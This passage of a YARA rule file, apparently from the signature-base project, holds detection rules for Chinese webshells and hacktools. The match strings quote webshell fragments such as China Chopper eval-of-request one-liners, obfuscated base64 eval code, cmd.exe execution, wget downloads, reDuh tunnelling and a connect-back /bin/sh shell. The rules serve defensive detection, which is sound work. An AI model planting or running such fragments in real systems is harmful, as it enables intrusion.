		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$txt=fopen(\"oracle_info.txt\",\"w\");" fullword ascii
		$s1 = "if(isset($_REQUEST['id']))" fullword ascii
		$s2 = "$id=$_REQUEST['id'];" fullword ascii

	condition:
		all of them
}
rule SIGNATURE_BASE_Reduhservers_Reduh : FILE {
    meta:
		description = "Chinese Hacktool Set - file reDuh.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "c87d971a-a16f-5593-88fb-6bcd207e0841"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L140-L155"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "377886490a86290de53d696864e41d6a547223b0"
		logic_hash = "dcb1515da696566d01ec64029a34438a56d2df480b9cd2ea586f71ffe3324c1a"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "out.println(\"[Error]Unable to connect to reDuh.jsp main process on port \" +ser" ascii
		$s4 = "System.out.println(\"IPC service failed to bind to \" + servicePort);" fullword ascii
		$s17 = "System.out.println(\"Bound on \" + servicePort);" fullword ascii
		$s5 = "outputFromSockets.add(\"[data]\"+target+\":\"+port+\":\"+sockNum+\":\"+new Strin" ascii

	condition:
		filesize <116KB and all of them
}
rule SIGNATURE_BASE_Item_Old : FILE {
    meta:
		description = "Chinese Hacktool Set - file item-old.php"
		author = "Florian Roth (Nextron Systems)"
		id = "c32bbd48-a363-53c7-84c6-c47581e2f9da"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L157-L172"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "daae358bde97e534bc7f2b0134775b47ef57e1da"
		logic_hash = "181e46408050490dccc4f321bd1072da0436d920e16cc4711b16425eb5bd73ed"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
		$s2 = "$sCmd = \"convert \".$sFile.\" -flip -quality 80 \".$sFileOut;" fullword ascii
		$s3 = "$sHash = md5($sURL);" fullword ascii

	condition:
		filesize <7KB and 2 of them
}
rule SIGNATURE_BASE_Tools_2014 : FILE {
    meta:
		description = "Chinese Hacktool Set - file 2014.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "bb76321b-003d-5f6b-a84b-425477abe91c"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L174-L189"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "74518faf08637c53095697071db09d34dbe8d676"
		logic_hash = "caa365cc1a641b7dcd5d2082240d981e66caf6da1379ee109a0bb1f651d1f00f"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
		$s4 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
		$s5 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii

	condition:
		filesize <715KB and all of them
}
rule SIGNATURE_BASE_Reduhservers_Reduh_2 : FILE {
    meta:
		description = "Chinese Hacktool Set - file reDuh.php"
		author = "Florian Roth (Nextron Systems)"
		id = "6050dfde-6c79-5dd8-a772-508668177aa5"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L191-L206"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "512d0a3e7bb7056338ad0167f485a8a6fa1532a3"
		logic_hash = "954115da374b6d72c35244673799be6e8bae5288f53509dea04e3ae3c489af12"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "errorlog(\"FRONTEND: send_command '\".$data.\"' on port \".$port.\" returned \"." ascii
		$s2 = "$msg = \"newData:\".$socketNumber.\":\".$targetHost.\":\".$targetPort.\":\".$seq" ascii
		$s3 = "errorlog(\"BACKEND: *** Socket key is \".$sockkey);" fullword ascii

	condition:
		filesize <57KB and all of them
}
rule SIGNATURE_BASE_Customize_2 : FILE {
    meta:
		description = "Chinese Hacktool Set - file Customize.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "1f7e9063-33d8-5df4-89d5-7d8fc1be61f0"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L208-L222"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "37cd17543e14109d3785093e150652032a85d734"
		logic_hash = "aa0940a21eea6ba50a93dd36a8f914f636fdba0685048fc67e16dd68c1c2794e"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "while((l=br.readLine())!=null){sb.append(l+\"\\r\\n\");}}" fullword ascii
		$s2 = "String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter" ascii

	condition:
		filesize <30KB and all of them
}
rule SIGNATURE_BASE_Chinachopper_One : FILE {
    meta:
		description = "Chinese Hacktool Set - file one.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "854fb5c9-38c7-5fd2-a473-66ae297070f5"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L224-L237"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "6cd28163be831a58223820e7abe43d5eacb14109"
		logic_hash = "f9a6e4b8556eb3f1e1cbe0bc4eb225b9564ac59aae4a97f184806c6bec95578d"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%eval request(" ascii

	condition:
		filesize <50 and all of them
}
rule SIGNATURE_BASE_CN_Tools_Old : FILE {
    meta:
		description = "Chinese Hacktool Set - file old.php"
		author = "Florian Roth (Nextron Systems)"
		id = "bfdb84e8-e5a8-53a4-ae71-e0d1b38d38ef"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L239-L255"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "f8a007758fda8aa1c0af3c43f3d7e3186a9ff307"
		logic_hash = "3f0ac357e9a9fb4ee937b53145b33ba1041310d979cbc3feb0a4caf026b9b730"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
		$s1 = "$sURL = \"http://\".$sServer.\"/\".$sFile;" fullword ascii
		$s2 = "chmod(\"/\".substr($sHash, 0, 2), 0777);" fullword ascii
		$s3 = "$sCmd = \"echo 123> \".$sFileOut;" fullword ascii

	condition:
		filesize <6KB and all of them
}
rule SIGNATURE_BASE_Item_301 : FILE {
    meta:
		description = "Chinese Hacktool Set - file item-301.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4ee9a089-313f-53c1-8196-1348d721dbf4"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L257-L273"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "15636f0e7dc062437608c1f22b1d39fa15ab2136"
		logic_hash = "623e235ff3eb0922fe8aee732144a15bcc0c580229654ae988353176f488b085"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$sURL = \"301:http://\".$sServer.\"/index.asp\";" fullword ascii
		$s2 = "(gov)\\\\.(cn)$/i\", $aURL[\"host\"])" ascii
		$s3 = "$aArg = explode(\" \", $sContent, 5);" fullword ascii
		$s4 = "$sURL = $aArg[0];" fullword ascii

	condition:
		filesize <3KB and 3 of them
}
rule SIGNATURE_BASE_CN_Tools_Item : FILE {
    meta:
		description = "Chinese Hacktool Set - file item.php"
		author = "Florian Roth (Nextron Systems)"
		id = "954f24c9-d7d5-56d3-86f0-0cf8832640dd"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L275-L291"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a584db17ad93f88e56fd14090fae388558be08e4"
		logic_hash = "1e927fd093aa11ad525f3f64d657f314520669b4237eac8f87d0be53cd848044"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$sURL = \"http://\".$sServer.\"/\".$sWget;" fullword ascii
		$s2 = "$sURL = \"301:http://\".$sServer.\"/\".$sWget;" fullword ascii
		$s3 = "$sWget=\"index.asp\";" fullword ascii
		$s4 = "$aURL += array(\"scheme\" => \"\", \"host\" => \"\", \"path\" => \"\");" fullword ascii

	condition:
		filesize <4KB and all of them
}
rule SIGNATURE_BASE_F3_Diy : FILE {
    meta:
		description = "Chinese Hacktool Set - file diy.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "9f36c6dd-89e8-511b-a499-131f1e8a420a"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L293-L307"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "f39c2f64abe5e86d8d36dbb7b1921c7eab63bec9"
		logic_hash = "37d6bc61d790ff30c98ded08ff875431fda525cd3ac10b4b1ba3f8f42167ed8c"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%@LANGUAGE=\"VBScript.Encode\" CODEPAGE=\"936\"%>" fullword ascii
		$s5 = ".black {" fullword ascii

	condition:
		uint16(0)==0x253c and filesize <10KB and all of them
}
rule SIGNATURE_BASE_Chinachopper_Temp : FILE {
    meta:
		description = "Chinese Hacktool Set - file temp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "f163787f-fcc9-568a-a12d-4057cb4f0d29"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L309-L325"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b0561ea52331c794977d69704345717b4eb0a2a7"
		logic_hash = "3669dfa10867970456f6638035a87d448e2b728387fbd07b59ffd981a1ab6200"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "o.run \"ff\",Server,Response,Request,Application,Session,Error" fullword ascii
		$s1 = "Set o = Server.CreateObject(\"ScriptControl\")" fullword ascii
		$s2 = "o.language = \"vbscript\"" fullword ascii
		$s3 = "o.addcode(Request(\"SC\"))" fullword ascii

	condition:
		filesize <1KB and all of them
}
rule SIGNATURE_BASE_Tools_2015 : FILE {
    meta:
		description = "Chinese Hacktool Set - file 2015.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "eb2826ab-ef8d-5a93-9ede-f5bbd7ab4ff4"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L327-L344"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8fc67359567b78cadf5d5c91a623de1c1d2ab689"
		logic_hash = "2b93ef42c277fd8415cf89bf1bef3e841c56a2b4aa1507d99b84cd8adc9a0644"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Configbis = new BufferedInputStream(httpUrl.getInputStream());" fullword ascii
		$s4 = "System.out.println(Oute.toString());" fullword ascii
		$s5 = "String ConfigFile = Outpath + \"/\" + request.getParameter(\"ConFile\");" fullword ascii
		$s8 = "HttpURLConnection httpUrl = null;" fullword ascii
		$s19 = "Configbos = new BufferedOutputStream(new FileOutputStream(Outf));;" fullword ascii

	condition:
		filesize <7KB and all of them
}
rule SIGNATURE_BASE_Chinachopper_Temp_2 : FILE {
    meta:
		description = "Chinese Hacktool Set - file temp.php"
		author = "Florian Roth (Nextron Systems)"
		id = "3952ed2b-fb27-5c45-9cd7-b7a300b37c0e"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L346-L359"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "604a4c07161ce1cd54aed5566e5720161b59deee"
		logic_hash = "1b6d840797afcdbf7c72836557dbd486780c760471e79133810346c301cca80b"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@eval($_POST[strtoupper(md5(gmdate(" ascii

	condition:
		filesize <150 and all of them
}
rule SIGNATURE_BASE_Templatr : FILE {
    meta:
		description = "Chinese Hacktool Set - file templatr.php"
		author = "Florian Roth (Nextron Systems)"
		id = "b361a49d-1e05-5597-bf8b-735e04397ffa"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L361-L374"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "759df470103d36a12c7d8cf4883b0c58fe98156b"
		logic_hash = "80d207ee47c0c602ddd281e0e187b83cdb4f1385f4b46ad2a4f5630b8f9e96a1"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "eval(gzinflate(base64_decode('" ascii

	condition:
		filesize <70KB and all of them
}
rule SIGNATURE_BASE_Reduhservers_Reduh_3 : FILE {
    meta:
		description = "Chinese Hacktool Set - file reDuh.aspx"
		author = "Florian Roth (Nextron Systems)"
		id = "69f5fd6b-a9b3-500b-8723-d1c82494903d"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L376-L392"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0744f64c24bf4c0bef54651f7c88a63e452b3b2d"
		logic_hash = "5a3bc023e0e8a5ccc8ee8e1b5e7ee0fca64e3f92b72d0aad15b25c82a23da487"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Response.Write(\"[Error]Unable to connect to reDuh.jsp main process on port \" +" ascii
		$s2 = "host = System.Net.Dns.Resolve(\"127.0.0.1\");" fullword ascii
		$s3 = "rw.WriteLine(\"[newData]\" + targetHost + \":\" + targetPort + \":\" + socketNum" ascii
		$s4 = "Response.Write(\"Error: Bad port or host or socketnumber for creating new socket" ascii

	condition:
		filesize <40KB and all of them
}
rule SIGNATURE_BASE_Chinachopper_Temp_3 : FILE {
    meta:
		description = "Chinese Hacktool Set - file temp.aspx"
		author = "Florian Roth (Nextron Systems)"
		id = "573e7da6-f58f-5814-b3e8-a0db3ecfe558"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L394-L408"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c5ecb8bc1d7f0e716b06107b5bd275008acaf7b7"
		logic_hash = "6a0d7817607362f325957e30cace24d32635b7e0411e161588ee573118f91b6a"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"" ascii
		$s1 = "\"],\"unsafe\");%>" ascii

	condition:
		uint16(0)==0x253c and filesize <150 and all of them
}
rule SIGNATURE_BASE_Shell_Asp : FILE {
    meta:
		description = "Chinese Hacktool Set Webshells - file Asp.html"
		author = "Florian Roth (Nextron Systems)"
		id = "52089205-8f36-5a0b-a1ae-67c91a253ad2"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L410-L425"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5e0bc914ac287aa1418f6554ddbe0ce25f2b5f20"
		logic_hash = "47c5c242713446471d5da4d9245b99561c26ad7fa016059076a6f0acab542c3c"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Session.Contents.Remove(m & \"userPassword\")" fullword ascii
		$s2 = "passWord = Encode(GetPost(\"password\"))" fullword ascii
		$s3 = "function Command(cmd, str){" fullword ascii

	condition:
		filesize <100KB and all of them
}
rule SIGNATURE_BASE_Txt_Aspxtag : FILE {
    meta:
		description = "Chinese Hacktool Set - Webshells - file aspxtag.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "e01a7235-5c69-5676-ac5d-c4e4632f31b2"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L428-L443"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "42cb272c02dbd49856816d903833d423d3759948"
		logic_hash = "6ffeee18945cab96673e4b9efc143017d168be12b794fa26aa4a304f15ae8e13"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "String wGetUrl=Request.QueryString[" fullword ascii
		$s2 = "sw.Write(wget);" fullword ascii
		$s3 = "Response.Write(\"Hi,Man 2015\"); " fullword ascii

	condition:
		filesize <2KB and all of them
}
rule SIGNATURE_BASE_Txt_Php : FILE {
    meta:
		description = "Chinese Hacktool Set - Webshells - file php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "65d5c46f-006d-58f9-bb7f-0a2e1f1853bd"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L445-L461"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "eaa1af4b898f44fc954b485d33ce1d92790858d0"
		logic_hash = "ace26e7c0dca285febf6b9192cbe59cc7e55e80f2f4e1a99aba25afcbeadeec1"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$Config=$_SERVER['QUERY_STRING'];" fullword ascii
		$s2 = "gzuncompress($_SESSION['api']),null);" ascii
		$s3 = "sprintf('%s?%s',pack(\"H*\"," ascii
		$s4 = "if(empty($_SESSION['api']))" fullword ascii

	condition:
		filesize <1KB and all of them
}
rule SIGNATURE_BASE_Txt_Aspx1 : FILE {
    meta:
		description = "Chinese Hacktool Set - Webshells - file aspx1.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "e01a7235-5c69-5676-ac5d-c4e4632f31b2"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L463-L477"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c5ecb8bc1d7f0e716b06107b5bd275008acaf7b7"
		logic_hash = "20bdadd6c8b61ab14f6280f55a90f541bf65c33675f979ebe489cc3967438e15"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item["
		$s1 = "],\"unsafe\");%>" fullword ascii

	condition:
		filesize <150 and all of them
}
rule SIGNATURE_BASE_Txt_Shell : FILE {
    meta:
		description = "Chinese Hacktool Set - Webshells - file shell.c"
		author = "Florian Roth (Nextron Systems)"
		id = "3e4c5928-346e-541b-b1a8-b37d5e3abc98"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L479-L496"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8342b634636ef8b3235db0600a63cc0ce1c06b62"
		logic_hash = "020e9e6ef776a9d69939fa3dec771dc516b0184086738bab439063acca89bd76"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "printf(\"Could not connect to remote shell!\\n\");" fullword ascii
		$s2 = "printf(\"Usage: %s <reflect ip> <port>\\n\", prog);" fullword ascii
		$s3 = "execl(shell,\"/bin/sh\",(char *)0);" fullword ascii
		$s4 = "char shell[]=\"/bin/sh\";" fullword ascii
		$s5 = "connect back door\\n\\n\");" fullword ascii

	condition:
		filesize <2KB and 2 of them
}
rule SIGNATURE_BASE_Txt_Asp : FILE {
    meta:
		description = "Chinese Hacktool Set - Webshells - file asp.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "39a2ba9a-c429-574f-8820-5e0270a4b84c"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L498-L512"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a63549f749f4d9d0861825764e042e299e06a705"
		logic_hash = "9eab239310fbebe8c88cbf8d0ee4123b8f3e2ebe601949e1e984e9cfde9869e7"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next:BodyCol" ascii
		$s2 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii

	condition:
		uint16(0)==0x253c and filesize <100KB and all of them
}
rule SIGNATURE_BASE_Txt_Asp1 : FILE {
    meta:
		description = "Chinese Hacktool Set - Webshells - file asp1.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "b00ab02c-c767-568c-be99-6cc731c3f1dc"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L514-L530"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "95934d05f0884e09911ea9905c74690ace1ef653"
		logic_hash = "77a4409b852d24228b0e1701f1ccc2abe3930c2c7240a43796b23042e706d9bf"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii
		$s2 = "autoLoginEnable=WSHShell.RegRead(autoLoginPath & autoLoginEnableKey)" fullword ascii
		$s3 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
		$s4 = "szTempFile = server.mappath(\"cmd.txt\")" fullword ascii

	condition:
		filesize <70KB and 2 of them
}
rule SIGNATURE_BASE_Txt_Php_2 : FILE {
    meta:
		description = "Chinese Hacktool Set - Webshells - file php.html"
		author = "Florian Roth (Nextron Systems)"
		id = "66916e32-9471-54bd-944e-bb751b38d3b0"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L532-L552"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a7d5fcbd39071e0915c4ad914d31e00c7127bcfc"
		logic_hash = "c08f62c3d468c2ebacd10fff6aa0c63bd303d627d487c070a9d22419bf6906cd"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "function connect($dbhost, $dbuser, $dbpass, $dbname='') {" fullword ascii
		$s2 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
		$s3 = "<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
		$s4 = "Powered by <a title=\"Build 20130112\" href=\"http://www.4ngel.net\" target=\"_b" ascii
		$s5 = "formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\'shell\\',null,this." ascii
		$s6 = "secparam('IP Configurate',execute('ipconfig -all'));" fullword ascii
		$s7 = "secparam('Hosts', @file_get_contents('/etc/hosts'));" fullword ascii
		$s8 = "p('<p><a href=\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\" target=" ascii

	condition:
		filesize <100KB and 4 of them
}
rule SIGNATURE_BASE_Txt_Ftp : FILE {
    meta:
		description = "Chinese Hacktool Set - Webshells - file ftp.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "311de4b0-fa19-545a-8a65-a40b255b5b39"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_cn_webshells.yar#L554-L573"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3495e6bcb5484e678ce4bae0bd1a420b7eb6ad1d"
